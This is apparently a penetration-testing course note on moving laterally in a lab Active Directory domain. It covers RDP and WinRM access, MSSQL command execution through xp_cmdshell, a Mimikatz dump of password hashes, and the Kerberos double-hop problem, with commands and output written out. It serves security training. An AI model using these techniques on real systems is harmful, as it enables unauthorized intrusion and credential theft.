- [Extras](#extras)
  - [Privileged Access](#privileged-access)
    - [RDP](#rdp)
      - [Enumerating the Remote Desktop Users Group](#enumerating-the-remote-desktop-users-group)
      - [Checking Remote Access Rights](#checking-remote-access-rights)
    - [WinRM](#winrm)
      - [Enumerating the Remote Management Users Group](#enumerating-the-remote-management-users-group)
      - [Using the Cypher Query in BloodHound](#using-the-cypher-query-in-bloodhound)
      - [Establishing WinRM Session from Windows](#establishing-winrm-session-from-windows)
      - [Connecting to a Target with Evil-WinRM](#connecting-to-a-target-with-evil-winrm)
    - [SQL Server Admin](#sql-server-admin)
      - [Using a Custom Cypher Query](#using-a-custom-cypher-query)
      - [Enumerating MSSQL with PowerUpSQL](#enumerating-mssql-with-powerupsql)
      - [mssqlclient.py](#mssqlclientpy)
  - [Kerberos "Double Hop" Problem](#kerberos-double-hop-problem)
    - [Background](#background)
    - [Workarounds](#workarounds)
      - [#1 PSCredential Object](#1-pscredential-object)
      - [#2 Register PSSession Configuration](#2-register-pssession-configuration)
  - [Bleeding Edge Vulnerabilities](#bleeding-edge-vulnerabilities)
    - [NoPac (_SamAccountName Spoofing_)](#nopac-samaccountname-spoofing)
      - [Scanning for NoPac](#scanning-for-nopac)
      - [Running NoPac \& Getting a Shell](#running-nopac--getting-a-shell)
      - [Confirming the Location of Saved Tickets](#confirming-the-location-of-saved-tickets)
      - [Using noPac to DCSync the Built-in Administrator Account](#using-nopac-to-dcsync-the-built-in-administrator-account)
    - [Windows Defender \& SMBEXEC.py Considerations](#windows-defender--smbexecpy-considerations)
    - [PrintNightmare](#printnightmare)

---

# Extras

## Privileged Access

Once you gain a foothold in the domain, your goal shifts to advancing your position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways you can move laterally. Typically, if you take over an account with local admin rights over a host, or set of hosts, you can perform a PtH attack to authenticate via the SMB protocol.

### RDP

Typically, if you have control of a local admin user on a given machine, you will be able to access it via RDP. Sometimes, you will obtain a foothold with a user that does not have local admin rights anywhere, but does have the rights to RDP into one or more machines. This access could be extremely useful to you as you could use the host position to:

- launch further attacks
- you may be able to escalate privileges and obtain credentials for a higher privileged user
- you may be able to pillage the host for sensitive data or credentials

#### Enumerating the Remote Desktop Users Group

Using PowerView, you could use the Get-NetLocalGroupMember function to begin enumerating members of the Remote Desktop Users group on a given host.

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

From the information above, you can see that all Domain Users can RDP to this host. It is common to see this on Remote Desktop Services hosts or hosts used as jump hosts. This type of server could be heavily used, and you could potentially find sensitive data that could be used to further your access, or you may find a local privilege escalation vector that could lead to local admin access and credential theft/account takeover for a user with more privileges in the domain. Typically the first thing to check in BloodHound:

"Does the Domain Users group have local admin rights or execution rights over one or more hosts?"

![ad extras 1](../../../../images/ad_extras1.png)

#### Checking Remote Access Rights

If you gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, you can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.

![ad extras 2](../../../../images/ad_extras2.png)

You could also check the Analysis tab and run the pre-built queries "Find Workstations where Domain Users can RDP" or "Find Server where Domain Users can RDP". There are other ways to enumerate this information, but BloodHound is a powerful tool that can help you narrow down these types of access rights quickly and accurately, which is hugely beneficial to you as pentesters under time constraints for the assessment period.

### WinRM

Like RDP, you may find that either a specific user or an entire group has WinRM access to one or more hosts. This could also be low-privileged access that you could use to hunt for sensitive data or attempt to escalate privileges or may result in local admin access, which could potentially be leveraged to further your access. You can again use the PowerView function Get-NetLocalGroupMember to the Remote Management Users group. This group has existed since the days of Windows 8 / Windows Server 2012 to enable WinRM access without granting local admin rights.

#### Enumerating the Remote Management Users Group

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

#### Using the Cypher Query in BloodHound

You can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![ad extras 3](../../../../images/ad_extras3.png)

You could also add this query as a custom query to your BloodHound installation, so it's always available to you.

![ad extras 4](../../../../images/ad_extras4.png)

#### Establishing WinRM Session from Windows

You can use the Enter-PSSession cmdlet using PowerShell from a Windows host.

```powershell
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

#### Connecting to a Target with Evil-WinRM

From your Linux attack host, you can use the tool evil-winrm to connect.

```bash
d41y@htb[/htb]$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents> hostname
ACADEMY-EA-MS01
```

### SQL Server Admin

More often than not, you will encounter SQL servers in the environments you face. It is common to find users and service accounts set up with sysadmin privileges on a given SQL server instance. You may obtain credentials for an account with this access via Kerberoasting or other such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.

#### Using a Custom Cypher Query

BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. You can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:

```
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

You can use your ACL rights to authenticate, change the password and then authenticate with the target using a tool such as [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet).

#### Enumerating MSSQL with PowerUpSQL

```powershell
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

You could then authenticate against the remote SQL server host and run custom queries or OS commands.

```powershell
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

#### mssqlclient.py

You can also authenticate from your Linux attack host using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the Impacket toolkit.

```bash
d41y@htb[/htb]$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
```

Once connected, you could type ```help``` to see what commands are available to you.

```bash
SQL> help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
```

You could then choose ```enable_xp_cmdshell``` to enable the xp_cmdshell stored procedure which allows for one to execute OS commands via the database if the account in question has the proper access rights.

```bash
SQL> enable_xp_cmdshell

[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Finally, you can run commands in the format ```xp_cmdshell <command>```. Here you can enumerate the rights that your user has on the system and see that you have SeImpersonatePrivilege, which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to SYSTEM level privileges, depending on the target host, and use this access to continue toward your goal.

```bash
xp_cmdshell whoami /priv
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

PRIVILEGES INFORMATION                                                             

----------------------                                                             

NULL                                                                               

Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   

SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    

SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    

SeImpersonatePrivilege        Impersonate a client after authentication Enabled    

SeCreateGlobalPrivilege       Create global objects                     Enabled    

SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL
```

## Kerberos "Double Hop" Problem

### Background

The "Double Hop" problem often occurs when using WinRM/PowerShell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM hash would be stored in memory. Sometimes you have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.

The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If you use Mimikatz to look at the session, you'll see that all credentials are blank. As stated previously, when you use Kerberos to establish a remote session, you are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when you go to access another resource, the machine can pull the hash from memory and authenticate you.

```powershell
PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 45177 (00000000:0000b079)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 1284107 (00000000:0013980b)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70669 (00000000:0001140d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 45178 (00000000:0000b07a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :
        credman :

Authentication Id : 0 ; 44190 (00000000:0000ac9e)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               :
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1284140 (00000000:0013982c)
Session           : Interactive from 1
User Name         : srvadmin
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 6/28/2022 3:46:05 PM
SID               : S-1-5-21-1666128402-2659679066-1433032234-1107
        msv :
         [00000003] Primary
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
         * DPAPI    : 64fa83034ef8a3a9b52c1861ac390bce
        tspkg :
        wdigest :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : srvadmin
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 70647 (00000000:000113f7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : fb ec 60 8b 93 99 ee 24 a1 dd bf fa a8 da fd 61 cc 14 5c 30 ea 6a e9 f4 bb bc ca 1f be a7 9e ce 8b 79 d8 cb 4d 65 d3 42 e7 a1 98 ad 8e 43 3e b5 77 80 40 c4 ce 61 27 90 37 dc d8 62 e1 77 7a 48 2d b2 d8 9f 4b b8 7a be e8 a4 20 3b 1e 32 67 a6 21 4a b8 e3 ac 01 00 d2 c3 68 37 fd ad e3 09 d7 f1 15 0d 52 ce fb 6d 15 8d b3 c8 c1 a3 c1 82 54 11 f9 5f 21 94 bb cb f7 cc 29 ba 3c c9 5d 5d 41 50 89 ea 79 38 f3 f2 3f 64 49 8a b0 83 b4 33 1b 59 67 9e b2 d1 d3 76 99 3c ae 5c 7c b7 1f 0d d5 fb cc f9 e2 67 33 06 fe 08 b5 16 c6 a5 c0 26 e0 30 af 37 28 5e 3b 0e 72 b8 88 7f 92 09 2e c4 2a 10 e5 0d f4 85 e7 53 5f 9c 43 13 90 61 62 97 72 bf bf 81 36 c0 6f 0f 4e 48 38 b8 c4 ca f8 ac e0 73 1c 2d 18 ee ed 8f 55 4d 73 33 a4 fa 32 94 a9
        ssp :

Authentication Id : 0 ; 996 (00000000:000003e4)
User Name         : DEV01$
Domain            : INLANEFREIGHT
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:32 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * NTLM     : ef6a3c65945643fbd1c3cf7639278b33
         * SHA1     : a2cfa43b1d8224fc44cc629d4dc167372f81543f
        tspkg :
        wdigest :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : DEV01$
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 6/28/2022 3:33:33 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

mimikatz(commandline) # exit
Bye!
```

There are indeed processes running in the context of the backupadmn user, such as ```wsmprovhost.exe```, which is the process that spawns when a Windows Remote PowerShell session is spawned.

```powershell
[DEV01]: PS C:\Users\Public> tasklist /V |findstr backupadm
wsmprovhost.exe               1844 Services                   0     85,212 K Unknown         INLANEFREIGHT\backupadm
                             0:00:03 N/A
tasklist.exe                  6532 Services                   0      7,988 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
conhost.exe                   7048 Services                   0     12,656 K Unknown         INLANEFREIGHT\backupadm
                             0:00:00 N/A
```

In the simplest terms, in this situation, when you try to issue a multi-server command, your credentials will not be sent from the first machine to the second.

Say you have three hosts: Attack host, DEV01, DC01. Your attack host is a parrot box within the corporate network but not joined to the domain. You obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. You want to use PowerView to enumerate the domain, which requires communication with the DC.

When you connect to DEV01 using a tool such as evil-winrm, you connect with network authentication, so your credentials are not stored in memory and, therefore, will not be present on the system to authenticate to other resources on behalf of your user. When you load a tool such as PowerView and attempt to query AD, Kerberos has no way of telling the DC thta your user can access resources in the domain. This happens because the user's Kerberos TGT ticket is not sent to the remote session; therefore, the user has no way to prove their identity, and commands will no longer be run in this user's context. In other words, when authenticating to the target host, the user's TGT ticket is sent to the remote service, which allows command execution, but the user's TGT ticket is not sent. When the user attempts to access subsequent resources in the domain, their TGT will not be present in the request, so the remote service will have no way to prove that the authentication is valid, and you will be denied access to the remote service.

If unconstrained delegation is enabled on a server, it is likely you won't face the "Double Hop" problem. In this scenario, when a user sends their TGT ticket to access the target server, their TGT will be sent along with the request. The target server now has the user's TGT ticket in memory and can use it to request a TGS ticket on their behalf on the next host they are attempting to access. In other words, the account's TGT ticket is cached, which has the ability to sign TGS tickets and grant remote access. Generally speaking, if you land on a box with unconstrained delegation, you already won and aren't worrying about this anyways.

### Workarounds

#### #1 PSCredential Object

You can also connect to the remote host via host A and set up a PSCredential object to pass your credentials again.

After connecting to a remote host with domain creds, you import PowerView and then try to run a command. As seen below, you get an error because you cannot pass your authentication on to the DC to query for the SPN accounts.

```bash
*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

If you check with ```klist```, you see that you only have a cached Kerberos ticket for your current server.

```bash
*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
```

So now, set up a PSCredential object and try again. First, you set up your authentication.

```bash
*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents>  $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)
```

Now you can try to query the SPN accounts using PowerView and are successful because you passed your creds along with the command.

```bash
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK

samaccountname
--------------
azureconnect
backupjob
krbtgt
mssqlsvc
sqltest
sqlqa
sqldev
mssqladm
svc_sql
sqlprod
sapsso
sapvc
vmwarescvc
```

If you try again without specifying the ```-credential``` flag, you once again get an error message.

```bash
get-domainuser -spn | select 

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\Users\backupadm\Documents\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
```

If you RDP to the same host, open a CMD prompt, and type ```klist```, you'll see that you have the necessary tickets cached to interact directly with the DC, and you don't need to worry about the double hop problem. This is because your password is stored in memory, so it can be sent along with every request you make.

```
C:\htb> klist

Current LogonId is 0:0x1e5b8b

Cached Tickets: (4)

#0>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 6/28/2022 9:13:38 (local)
        End Time:   6/28/2022 19:13:38 (local)
        Renew Time: 7/5/2022 9:13:38 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x2 -> DELEGATION
        Kdc Called: DC01.INLANEFREIGHT.LOCAL

#1>     Client: backupadm @ INLANEFREIGHT.LOCAL
        Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
